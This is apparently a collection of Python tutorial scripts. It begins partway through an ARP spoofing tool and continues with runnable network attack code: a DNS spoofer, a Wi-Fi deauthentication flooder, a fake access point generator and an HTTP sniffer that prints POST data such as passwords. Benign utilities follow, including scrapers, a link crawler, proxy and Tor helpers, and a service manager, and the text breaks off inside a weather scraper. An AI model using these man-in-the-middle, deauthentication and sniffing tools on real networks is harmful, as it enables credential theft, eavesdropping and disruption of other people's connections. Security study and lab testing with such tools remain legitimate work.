    """
    Enables IP forwarding
    """
    if verbose:
        print("[!] Enabling IP Routing...")
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")


def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
        

def spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs target_ip saying that we are host_ip.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


def restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of host_ip ) to target_ip
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP spoof script")
    parser.add_argument("target", help="Victim IP Address to ARP poison")
    parser.add_argument("host", help="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
    parser.add_argument("-v", "--verbose", action="store_true", help="verbosity, default is True (simple message each second)")
    args = parser.parse_args()
    target, host, verbose = args.target, args.host, args.verbose

    enable_ip_route()
    try:
        while True:
            # telling the target that we are the host
            spoof(target, host, verbose)
            # telling the host that we are the target
            spoof(host, target, verbose)
            # sleep for one second
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target, host)
        restore(host, target)




import win32serviceutil
import time


class WService:

    def __init__(self, service, machine=None, verbose=False):
        self.service = service
        self.machine = machine
        self.verbose = verbose
        
    property
    def running(self):
        return win32serviceutil.QueryServiceStatus(self.service)[1] == 4

    def start(self):
        if not self.running:
            win32serviceutil.StartService(self.service)
            time.sleep(1)
            if self.running:
                if self.verbose:
                    print(f"[+] {self.service} started successfully.")
                return True
            else:
                if self.verbose:
                    print(f"[-] Cannot start {self.service}")
                return False
        elif self.verbose:
            print(f"[!] {self.service} is already running.")
    
    def stop(self):
        if self.running:
            win32serviceutil.StopService(self.service)
            time.sleep(0.5)
            if not self.running:
                if self.verbose:
                    print(f"[+] {self.service} stopped successfully.")
                return True
            else:
                if self.verbose:
                    print(f"[-] Cannot stop {self.service}")
                return False
        elif self.verbose:
            print(f"[!] {self.service} is not running.")

    def restart(self):
        if self.running:
            win32serviceutil.RestartService(self.service)
            time.sleep(2)
            if self.running:
                if self.verbose:
                    print(f"[+] {self.service} restarted successfully.")
                return True
            else:
                if self.verbose:
                    print(f"[-] Cannot start {self.service}")
                return False
        elif self.verbose:
            print(f"[!] {self.service} is not running.")


def main(action, service):
    service = WService(service, verbose=True)
    if action == "start":
        service.start()
    elif action == "stop":
        service.stop()
    elif action == "restart":
        service.restart()

    # getattr(remoteAccessService, action, "start")()

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Windows Service Handler")
    parser.add_argument("service")
    parser.add_argument("-a", "--action", help="action to do, 'start', 'stop' or 'restart'",
                        action="store", required=True, dest="action")

    given_args = parser.parse_args()

    service, action = given_args.service, given_args.action

    main(action, service)




from scapy.all import *
import time

hosts = []
Ether = 1


def listen_dhcp():
    # Make sure it is DHCP with the filter options
    k = sniff(prn=print_packet, filter='udp and (port 67 or port 68)')

def print_packet(packet):
    target_mac, requested_ip, hostname, vendor_id = [None] * 4
    if packet.haslayer(Ether):
        target_mac = packet.getlayer(Ether).src
    # get the DHCP options
    dhcp_options = packet[DHCP].options
    for item in dhcp_options:
        try:
            label, value = item
        except ValueError:
            continue
        if label == 'requested_addr':
            requested_ip = value
        elif label == 'hostname':
            hostname = value.decode()
        elif label == 'vendor_class_id':
            vendor_id = value.decode()
        if target_mac and vendor_id and hostname and requested_ip and target_mac not in hosts:
            hosts.append(target_mac)
            time_now = time.strftime("[%Y-%m-%d - %H:%M:%S] ")
            print("{}: {}  -  {} / {} requested {}".format(time_now, target_mac, hostname, vendor_id, requested_ip))


if __name__ == "__main__":
    listen_dhcp()




from scapy.all import *
from netfilterqueue import NetfilterQueue
import os


# DNS mapping records, feel free to add/modify this dictionary
# for example, google.com will be redirected to 192.168.1.100
dns_hosts = {
    b"www.google.com.": "192.168.1.100",
    b"google.com.": "192.168.1.100",
    b"facebook.com.": "172.217.19.142"
}


def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()


def modify_packet(packet):
    """
    Modifies the DNS Resource Record packet ( the answer part)
    to map our globally defined dns_hosts dictionary.
    For instance, whenver we see a google.com answer, this function replaces 
    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
    """
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet


if __name__ == "__main__":
    QUEUE_NUM = 0
    # insert the iptables FORWARD rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # instantiate the netfilter queue
    queue = NetfilterQueue()
    try:
        # bind the queue number to our callback process_packet
        # and start it
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        # if want to exit, make sure we
        # remove that rule we just inserted, going back to normal.
        os.system("iptables --flush")




from scapy.all import *
from threading import Thread
from faker import Faker


def send_beacon(ssid, mac, infinite=True):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    # type=0:       management frame
    # subtype=8:    beacon frame
    # addr1:        MAC address of the receiver
    # addr2:        MAC address of the sender
    # addr3:        MAC address of the Access Point (AP)

    # beacon frame

    beacon = Dot11Beacon()
    
    # we inject the ssid name
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    

    # stack all the layers and add a RadioTap
    frame = RadioTap()/dot11/beacon/essid

    # send the frame
    if infinite:
        sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)
    else:
        sendp(frame, iface=iface, verbose=0)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Fake Access Point Generator")
    parser.add_argument("interface", default="wlan0mon", help="The interface to send beacon frames with, must be in monitor mode")
    parser.add_argument("-n", "--access-points", dest="n_ap", help="Number of access points to be generated")
    args = parser.parse_args()
    n_ap = args.n_ap
    iface = args.interface

    # generate random SSIDs and MACs
    faker = Faker()

    ssids_macs = [ (faker.name(), faker.mac_address()) for i in range(n_ap) ]
    for ssid, mac in ssids_macs:
        Thread(target=send_beacon, args=(ssid, mac)).start()




from scapy.all import *
from scapy.layers.http import HTTPRequest # import HTTP packet
from colorama import init, Fore

# initialize colorama
init()

# define colors
GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET


def sniff_packets(iface=None):
    """
    Sniff 80 port packets with iface, if None (default), then the
    scapy's default interface is used
    """
    if iface:
        # port 80 for http (generally)
        # process_packet is the callback
        sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
    else:
        # sniff with default interface
        sniff(filter="port 80", prn=process_packet, store=False)


def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    if packet.haslayer(HTTPRequest):
        # if this packet is an HTTP Request
        # get the requested URL
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        # get the requester's IP Address
        ip = packet[IP].src
        # get the request method
        method = packet[HTTPRequest].Method.decode()
        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
        if show_raw and packet.haslayer(Raw) and method == "POST":
            # if show_raw flag is enabled, has raw data, and the requested method is "POST"
            # then show raw
            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
                                                 + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")

    # parse arguments
    args = parser.parse_args()
    iface = args.iface
    show_raw = args.show_raw

    sniff_packets(iface)




from scapy.all import *


def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlan0mon", verbose=1):
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="A python script for sending deauthentication frames")
    parser.add_argument("target", help="Target MAC address to deauthenticate.")
    parser.add_argument("gateway", help="Gateway MAC address that target is authenticated with")
    parser.add_argument("-c" , "--count", help="number of deauthentication frames to send, specify 0 to keep sending infinitely, default is 0", default=0)
    parser.add_argument("--interval", help="The sending frequency between two frames sent, default is 100ms", default=0.1)
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0mon'", default="wlan0mon")
    parser.add_argument("-v", "--verbose", help="wether to print messages", action="store_true")

    args = parser.parse_args()
    target = args.target
    gateway = args.gateway
    count = int(args.count)
    interval = float(args.interval)
    iface = args.iface
    verbose = args.verbose

    if count == 0:
        # if count is 0, it means we loop forever (until interrupt)
        loop = 1
        count = None
    else:
        loop = 0

    # printing some info messages"
    if verbose:
        if count:
            print(f"[+] Sending {count} frames every {interval}s...")
        else:
            print(f"[+] Sending frames every {interval}s for ever...")

    deauth(target, gateway, interval, count, loop, iface, verbose)




from scapy.all import ARP, Ether, srp

target_ip = "192.168.1.1/24"
# IP Address for the destination
# create ARP packet
arp = ARP(pdst=target_ip)
# create the Ether broadcast packet
# ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
# stack them
packet = ether/arp

result = srp(packet, timeout=3, verbose=0)[0]

# a list of clients, we will fill this in the upcoming loop
clients = []

for sent, received in result:
    # for each response, append ip and mac address to clients list
    clients.append({'ip': received.psrc, 'mac': received.hwsrc})

# print clients
print("Available devices in the network:")
print("IP" + " "*18+"MAC")
for client in clients:
    print("{:16}    {}".format(client['ip'], client['mac']))




from scapy.all import *
from threading import Thread
import pandas
import time
import os
import sys


# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

def callback(packet):
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # get the crypto
        crypto = stats.get("crypto")
        networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)


def print_all():
    while True:
        os.system("clear")
        print(networks)
        time.sleep(0.5)


def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)


if __name__ == "__main__":
    # interface name, check using iwconfig
    interface = sys.argv[1]
    # start the thread that prints all the networks
    printer = Thread(target=print_all)
    printer.daemon = True
    printer.start()
    # start the channel changer
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    # start sniffing
    sniff(prn=callback, iface=interface)




import requests
import os
from tqdm import tqdm
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse


def is_valid(url):
    """
    Checks whether url is a valid URL.
    """
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)


def get_all_images(url):
    """
    Returns all image URLs on a single url
    """
    soup = bs(requests.get(url).content, "html.parser")
    urls = []
    for img in tqdm(soup.find_all("img"), "Extracting images"):
        img_url = img.attrs.get("src")
        if not img_url:
            # if img does not contain src attribute, just skip
            continue
        # make the URL absolute by joining domain with the URL that is just extracted
        img_url = urljoin(url, img_url)
        # remove URLs like '/hsts-pixel.gif?c=3.2.5'
        try:
            pos = img_url.index("?")
            img_url = img_url[:pos]
        except ValueError:
            pass
        # finally, if the url is valid
        if is_valid(img_url):
            urls.append(img_url)
    return urls


def download(url, pathname):
    """
    Downloads a file given an URL and puts it in the folder pathname
    """
    # if path doesn't exist, make that path dir
    if not os.path.isdir(pathname):
        os.makedirs(pathname)
    # download the body of response by chunk, not immediately
    response = requests.get(url, stream=True)

    # get the total file size
    file_size = int(response.headers.get("Content-Length", 0))

    # get the file name
    filename = os.path.join(pathname, url.split("/")[-1])

    # progress bar, changing the unit to bytes instead of iteration (default by tqdm)
    progress = tqdm(response.iter_content(1024), f"Downloading {filename}", total=file_size, unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "wb") as f:
        for data in progress:
            # write data read to the file
            f.write(data)
            # update the progress bar manually
            progress.update(len(data))


def main(url, path):
    # get all images
    imgs = get_all_images(url)
    for img in imgs:
        # for each img, download it
        download(img, path)
    


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="This script downloads all images from a web page")
    parser.add_argument("url", help="The URL of the web page you want to download images")
    parser.add_argument("-p", "--path", help="The Directory you want to store your images, default is the domain of URL passed")
    
    args = parser.parse_args()
    url = args.url
    path = args.path

    if not path:
        # if path isn't specified, use the domain name of that url as the folder name
        path = urlparse(url).netloc
    
    main(url, path)




from requests_html import HTMLSession
import requests
from tqdm import tqdm
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse

import os


def is_valid(url):
    """
    Checks whether url is a valid URL.
    """
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)


def get_all_images(url):
    """
    Returns all image URLs on a single url
    """
    # initialize the session
    session = HTMLSession()
    # make the HTTP request and retrieve response
    response = session.get(url)
    # execute Javascript
    response.html.render()
    # construct the soup parser
    soup = bs(response.html.html, "html.parser")
    urls = []
    for img in tqdm(soup.find_all("img"), "Extracting images"):
        img_url = img.attrs.get("src") or img.attrs.get("data-src")
        if not img_url:
            # if img does not contain src attribute, just skip
            continue
        # make the URL absolute by joining domain with the URL that is just extracted
        img_url = urljoin(url, img_url)
        # remove URLs like '/hsts-pixel.gif?c=3.2.5'
        try:
            pos = img_url.index("?")
            img_url = img_url[:pos]
        except ValueError:
            pass
        # finally, if the url is valid
        if is_valid(img_url):
            urls.append(img_url)
    return urls


def download(url, pathname):
    """
    Downloads a file given an URL and puts it in the folder pathname
    """
    # if path doesn't exist, make that path dir
    if not os.path.isdir(pathname):
        os.makedirs(pathname)
    # download the body of response by chunk, not immediately
    response = requests.get(url, stream=True)

    # get the total file size
    file_size = int(response.headers.get("Content-Length", 0))

    # get the file name
    filename = os.path.join(pathname, url.split("/")[-1])

    # progress bar, changing the unit to bytes instead of iteration (default by tqdm)
    progress = tqdm(response.iter_content(1024), f"Downloading {filename}", total=file_size, unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "wb") as f:
        for data in progress:
            # write data read to the file
            f.write(data)
            # update the progress bar manually
            progress.update(len(data))


def main(url, path):
    # get all images
    imgs = get_all_images(url)
    for img in imgs:
        # for each img, download it
        download(img, path)
    


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="This script downloads all images from a web page")
    parser.add_argument("url", help="The URL of the web page you want to download images")
    parser.add_argument("-p", "--path", help="The Directory you want to store your images, default is the domain of URL passed")
    
    args = parser.parse_args()
    url = args.url
    path = args.path

    if not path:
        # if path isn't specified, use the domain name of that url as the folder name
        path = urlparse(url).netloc
    
    main(url, path)




import re
from requests_html import HTMLSession
import sys

url = sys.argv[1]
EMAIL_REGEX = r"""(?:[a-z0-9!#%&'*+/=?^_{|}-]+(?:\.[a-z0-9!#%&'*+/=?^_{|}-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9]))\.){3}(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9])|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])"""

# initiate an HTTP session
session = HTMLSession()
# get the HTTP Response
r = session.get(url)
# for JAVA-Script driven websites
r.html.render()
with open(sys.argv[2], "a") as f:
    for re_match in re.finditer(EMAIL_REGEX, r.html.raw_html.decode()):
        print(re_match.group().strip(), file=f)




from bs4 import BeautifulSoup
from requests_html import HTMLSession
from pprint import pprint

# initialize an HTTP session
session = HTMLSession()


def get_all_forms(url):
    """Returns all form tags found on a web page's url """
    # GET request
    res = session.get(url)
    # for javascript driven website
    # res.html.render()
    soup = BeautifulSoup(res.html.html, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    """Returns the HTML details of a form,
    including action, method and list of form controls (inputs, etc)"""
    details = {}
    # get the form action (requested URL)
    action = form.attrs.get("action").lower()
    # get the form method (POST, GET, DELETE, etc)
    # if not specified, GET is the default in HTML
    method = form.attrs.get("method", "get").lower()
    # get all form inputs
    inputs = []
    for input_tag in form.find_all("input"):
        # get type of input form control
        input_type = input_tag.attrs.get("type", "text")
        # get name attribute
        input_name = input_tag.attrs.get("name")
        # get the default value of that input tag
        input_value =input_tag.attrs.get("value", "")
        # add everything to that list
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


if __name__ == "__main__":
    import sys
    # get URL from the command line
    url = sys.argv[1]
    # get all form tags
    forms = get_all_forms(url)
    # iteratte over forms
    for i, form in enumerate(forms, start=1):
        form_details = get_form_details(form)
        print("="*50, f"form #{i}", "="*50)
        pprint(form_details)




from bs4 import BeautifulSoup
from requests_html import HTMLSession

from pprint import pprint
from urllib.parse import urljoin
import webbrowser
import sys

from form_extractor import get_all_forms, get_form_details, session

# get the URL from the command line
url = sys.argv[1]
# get the first form (edit this as you wish)
first_form = get_all_forms(url)[0]
# extract all form details
form_details = get_form_details(first_form)
pprint(form_details)
# the data body we want to submit
data = {}
for input_tag in form_details["inputs"]:
    if input_tag["type"] == "hidden":
        # if it's hidden, use the default value
        data[input_tag["name"]] = input_tag["value"]
    elif input_tag["type"] != "submit":
        # all others except submit, prompt the user to set it
        value = input(f"Enter the value of the field '{input_tag['name']}' (type: {input_tag['type']}): ")
        data[input_tag["name"]] = value

# join the url with the action (form request URL)
url = urljoin(url, form_details["action"])

if form_details["method"] == "post":
    res = session.post(url, data=data)
elif form_details["method"] == "get":
    res = session.get(url, params=data)

# the below code is only for replacing relative URLs to absolute ones
soup = BeautifulSoup(res.content, "html.parser")
for link in soup.find_all("link"):
    try:
        link.attrs["href"] = urljoin(url, link.attrs["href"])
    except:
        pass
for script in soup.find_all("script"):
    try:
        script.attrs["src"] = urljoin(url, script.attrs["src"])
    except:
        pass
for img in soup.find_all("img"):
    try:
        img.attrs["src"] = urljoin(url, img.attrs["src"])
    except:
        pass
for a in soup.find_all("a"):
    try:
        a.attrs["href"] = urljoin(url, a.attrs["href"])
    except:
        pass

# write the page content to a file
open("page.html", "w").write(str(soup))
# open the page on the default browser
webbrowser.open("page.html")




import requests
import pandas as pd
from bs4 import BeautifulSoup as bs

USER_AGENT = "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
# US english
LANGUAGE = "en-US,enq=0.5"

def get_soup(url):
    """Constructs and returns a soup using the HTML content of url passed"""
    # initialize a session
    session = requests.Session()
    # set the User-Agent as a regular browser
    session.headers['User-Agent'] = USER_AGENT
    # request for english content (optional)
    session.headers['Accept-Language'] = LANGUAGE
    session.headers['Content-Language'] = LANGUAGE
    # make the request
    html = session.get(url)
    # return the soup
    return bs(html.content, "html.parser")


def get_all_tables(soup):
    """Extracts and returns all tables in a soup object"""
    return soup.find_all("table")


def get_table_headers(table):
    """Given a table soup, returns all the headers"""
    headers = []
    for th in table.find("tr").find_all("th"):
        headers.append(th.text.strip())
    return headers


def get_table_rows(table):
    """Given a table, returns all its rows"""
    rows = []
    for tr in table.find_all("tr")[1:]:
        cells = []
        # grab all td tags in this table row
        tds = tr.find_all("td")
        if len(tds) == 0:
            # if no td tags, search for th tags
            # can be found especially in wikipedia tables below the table
            ths = tr.find_all("th")
            for th in ths:
                cells.append(th.text.strip())
        else:
            # use regular td tags
            for td in tds:
                cells.append(td.text.strip())
        rows.append(cells)
    return rows


def save_as_csv(table_name, headers, rows):
    pd.DataFrame(rows, columns=headers).to_csv(f"{table_name}.csv")


def main(url):
    # get the soup
    soup = get_soup(url)
    # extract all the tables from the web page
    tables = get_all_tables(soup)
    print(f"[+] Found a total of {len(tables)} tables.")
    # iterate over all tables
    for i, table in enumerate(tables, start=1):
        # get the table headers
        headers = get_table_headers(table)
        # get all the rows of the table
        rows = get_table_rows(table)
        # save table as csv file
        table_name = f"table-{i}"
        print(f"[+] Saving {table_name}")
        save_as_csv(table_name, headers, rows)


if __name__ == "__main__":
    import sys
    try:
        url = sys.argv[1]
    except IndexError:
        print("Please specify a URL.\nUsage: python html_table_extractor.py [URL]")
        exit(1)
    main(url)




import requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import colorama

# init the colorama module
colorama.init()

GREEN = colorama.Fore.GREEN
GRAY = colorama.Fore.LIGHTBLACK_EX
RESET = colorama.Fore.RESET

# initialize the set of links (unique links)
internal_urls = set()
external_urls = set()

total_urls_visited = 0


def is_valid(url):
    """
    Checks whether url is a valid URL.
    """
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)


def get_all_website_links(url):
    """
    Returns all URLs that is found on url in which it belongs to the same website
    """
    # all URLs of url
    urls = set()
    # domain name of the URL without the protocol
    domain_name = urlparse(url).netloc
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    for a_tag in soup.findAll("a"):
        href = a_tag.attrs.get("href")
        if href == "" or href is None:
            # href empty tag
            continue
        # join the URL if it's relative (not absolute link)
        href = urljoin(url, href)
        parsed_href = urlparse(href)
        # remove URL GET parameters, URL fragments, etc.
        href = parsed_href.scheme + "://" + parsed_href.netloc + parsed_href.path
        if not is_valid(href):
            # not a valid URL
            continue
        if href in internal_urls:
            # already in the set
            continue
        if domain_name not in href:
            # external link
            if href not in external_urls:
                print(f"{GRAY}[!] External link: {href}{RESET}")
                external_urls.add(href)
            continue
        print(f"{GREEN}[*] Internal link: {href}{RESET}")
        urls.add(href)
        internal_urls.add(href)
    return urls


def crawl(url, max_urls=50):
    """
    Crawls a web page and extracts all links.
    You'll find all links in external_urls and internal_urls global set variables.
    params:
        max_urls (int): number of max urls to crawl, default is 30.
    """
    global total_urls_visited
    total_urls_visited += 1
    links = get_all_website_links(url)
    for link in links:
        if total_urls_visited > max_urls:
            break
        crawl(link, max_urls=max_urls)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Link Extractor Tool with Python")
    parser.add_argument("url", help="The URL to extract links from.")
    parser.add_argument("-m", "--max-urls", help="Number of max URLs to crawl, default is 30.", default=30, type=int)
    
    args = parser.parse_args()
    url = args.url
    max_urls = args.max_urls

    crawl(url, max_urls=max_urls)

    print("[+] Total Internal links:", len(internal_urls))
    print("[+] Total External links:", len(external_urls))
    print("[+] Total URLs:", len(external_urls) + len(internal_urls))

    domain_name = urlparse(url).netloc

    # save the internal links to a file
    with open(f"{domain_name}_internal_links.txt", "w") as f:
        for internal_link in internal_urls:
            print(internal_link.strip(), file=f)

    # save the external links to a file
    with open(f"{domain_name}_external_links.txt", "w") as f:
        for external_link in external_urls:
            print(external_link.strip(), file=f)




import requests
import random
from bs4 import BeautifulSoup as bs

def get_free_proxies():
    url = "https://free-proxy-list.net/"
    # get the HTTP response and construct soup object
    soup = bs(requests.get(url).content, "html.parser")
    proxies = []
    for row in soup.find("table", attrs={"id": "proxylisttable"}).find_all("tr")[1:]:
        tds = row.find_all("td")
        try:
            ip = tds[0].text.strip()
            port = tds[1].text.strip()
            host = f"{ip}:{port}"
            proxies.append(host)
        except IndexError:
            continue
    return proxies


def get_session(proxies):
    # construct an HTTP session
    session = requests.Session()
    # choose one random proxy
    proxy = random.choice(proxies)
    session.proxies = {"http": proxy, "https": proxy}
    return session


if __name__ == "__main__":
    # proxies = get_free_proxies()
    proxies = [
        '167.172.248.53:3128',
        '194.226.34.132:5555',
        '203.202.245.62:80',
        '141.0.70.211:8080',
        '118.69.50.155:80',
        '201.55.164.177:3128',
        '51.15.166.107:3128',
        '91.205.218.64:80',
        '128.199.237.57:8080',
    ]
    for i in range(5):
        s = get_session(proxies)
        try:
            print("Request page with IP:", s.get("http://icanhazip.com", timeout=1.5).text.strip())
        except Exception as e:
            continue




import requests
from stem.control import Controller
from stem import Signal

def get_tor_session():
    # initialize a requests Session
    session = requests.Session()
    # setting the proxy of both http & https to the localhost:9050 
    # (Tor service must be installed and started in your machine)
    session.proxies = {"http": "socks5://localhost:9050", "https": "socks5://localhost:9050"}
    return session

def renew_connection():
    with Controller.from_port(port=9051) as c:
        c.authenticate()
        # send NEWNYM signal to establish a new clean connection through the Tor network
        c.signal(Signal.NEWNYM)


if __name__ == "__main__":
    s = get_tor_session()
    ip = s.get("http://icanhazip.com").text
    print("IP:", ip)
    renew_connection()
    s = get_tor_session()
    ip = s.get("http://icanhazip.com").text
    print("IP:", ip)




import requests


def get_tor_session():
    # initialize a requests Session
    session = requests.Session()
    # this requires a running Tor service in your machine and listening on port 9050 (by default)
    session.proxies = {"http": "socks5://localhost:9050", "https": "socks5://localhost:9050"}
    return session


if __name__ == "__main__":
    s = get_tor_session()
    ip = s.get("http://icanhazip.com").text
    print("IP:", ip)




import requests

url = "http://icanhazip.com"
proxy_host = "proxy.crawlera.com"
proxy_port = "8010"
proxy_auth = ":"
proxies = {
       "https": f"https://{proxy_auth}{proxy_host}:{proxy_port}/",
       "http": f"http://{proxy_auth}{proxy_host}:{proxy_port}/"
}

r = requests.get(url, proxies=proxies, verify=False)




from bs4 import BeautifulSoup as bs
import requests

USER_AGENT = "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
# US english
LANGUAGE = "en-US,enq=0.5"

def get_weather_data(url):
    session = requests.Session()
    session.headers['User-Agent'] = USER_AGENT
    session.headers['Accept-Language'] = LANGUAGE
    session.headers['Content-Language'] = LANGUAGE
    html = session.get(url)
    # create a new soup
    soup = bs(html.text, "html.parser")
    # store all results on this dictionary
    result = {}
    # extract region
    result['region'] = soup.find("div", attrs={"id": "wob_loc"}).text
    # extract temperature now
    result['temp_now'] = soup.find("span", attrs={"id": "wob_tm"}).text
    # get the day and hour now
    result['dayhour'] = soup.find("div", attrs={"id": "wob_dts"}).text
    # get the actual weather
    result['weather_now'] = soup.find("span", attrs={"id": "wob_dc"}).text
    # get the precipitation
    result['precipitation'] = soup.find("span", attrs={"id": "wob_pp"}).text
    # get the % of humidity
    result['humidity'] = soup.find("span", attrs={"id": "wob_hm"}).text
    # extract the wind
    result['wind'] = soup.find("span", attrs={"id": "wob_ws"}).text
    # get next few days' weather
    next_days = []
    days = soup.find("div", attrs={"id": "wob_dp"})
    for day in days.findAll("div", attrs={"class": "wob_df"}):
        # extract the name of the day
